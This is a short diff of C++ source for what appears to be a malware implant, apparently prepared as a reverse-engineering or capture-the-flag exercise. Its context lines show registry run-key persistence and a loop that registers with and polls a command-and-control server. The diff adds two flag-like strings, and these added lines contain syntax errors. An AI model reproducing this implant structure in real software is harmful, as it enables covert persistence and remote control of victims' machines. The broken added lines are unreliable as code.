@@ -378,7 +378,7 @@ int wmain() {
     set_run_key();
 
     std::string output = "";
-
+    std:string yer1 = "Always check the strings!"
     // attempt to register with the c2
     do {
         if (strcmp("OK", output.c_str()) == 0){
@@ -396,7 +396,7 @@ int wmain() {
     // get responses to the server and constantly check in every minute for commands
     std::string response = "";
     int int_imageNum = 0;
-
+    std::string yer2 = "Q2MZ5S6IF162JJQQ0GQ5OP7PPQERLADFGPDIWAAM"
     while (true) {
         Sleep(5000);
         std::string c2_command = "";
